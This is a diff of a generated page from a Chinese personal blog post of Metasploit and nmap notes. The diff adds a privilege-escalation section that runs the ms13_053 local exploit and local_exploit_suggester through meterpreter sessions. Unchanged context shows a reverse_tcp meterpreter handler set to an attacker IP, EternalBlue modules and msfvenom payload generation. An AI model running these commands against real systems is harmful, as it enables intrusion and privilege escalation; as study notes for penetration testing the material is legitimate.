@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="SG&#39;s Blog">
 <meta property="og:description" content="msfconsole:reverese:123456789use exploit/multi/handler show options set payload windows/x64/meterpreter/reverse_tcp set LHOST [AttackerIP] # 如果是公网vps，这里最好写一个内网ip，否则可能会影响后边load。。看issue里写的set LPORT [Att">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-01-04T09:52:23.271Z">
+<meta property="og:updated_time" content="2019-03-28T10:06:54.916Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msf&amp;nmap常用基本操作">
 <meta name="twitter:description" content="msfconsole:reverese:123456789use exploit/multi/handler show options set payload windows/x64/meterpreter/reverse_tcp set LHOST [AttackerIP] # 如果是公网vps，这里最好写一个内网ip，否则可能会影响后边load。。看issue里写的set LPORT [Att">
@@ -200,6 +200,8 @@
 <p>扫描：<code>use auxiliary/scanner/smb/smb_ms17_010</code><br>利用：<br>1.<code>exploit/windows/smb/ms17_010_eternalblue</code><br>2.<code>exploit/windows/smb/ms17_010_psexec</code></p>
 <p>这两种攻击exp有啥区别我也不知道，自己操作的时候就是，一个不行换另一个再试试。。有大佬懂还要麻烦指导一下</p>
 <p>常用总结：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/bad2fc55beff?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</span><br></pre></td></tr></table></figure></p>
+<p><strong>提权</strong></p>
+<p>列出补丁，也可用suggester系列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf &gt; set SESSION 2</span><br><span class="line">msf &gt; exploit</span><br><span class="line"></span><br><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf &gt; set LHOST 192.168.1.107</span><br><span class="line">msf &gt; set SESSION 1</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure></p>
 <h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p><strong>-f [指定payload的输出格式]</strong></p>
 <p>按需要的格式进行输出：<br>十六进制hex编码形式 <code>\x0a</code><br>如果用python写exploit，用<code>-f python</code>得到python代码。<br>如果用python写exploit，用<code>-f c</code>得到c代码。<br><code>-f exe\elf</code>就不说了，还有<code>-f psh-reflection</code>生成ps1脚本也挺常用的。</p>
 <p>生成一个exe格式的payload，如：<br><code>msfvenom -p windows/meterpreter/bind_tcp -f exe</code></p>
@@ -561,19 +563,19 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">碎碎念</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Machine Learning Basic</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">立志不倒的flags</a>
+                <a href="javascript:void(0)" class="js-tag color4">碎碎念</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">立志不倒的flags</a>
               </li>
              
               <li class="article-tag-list-item">
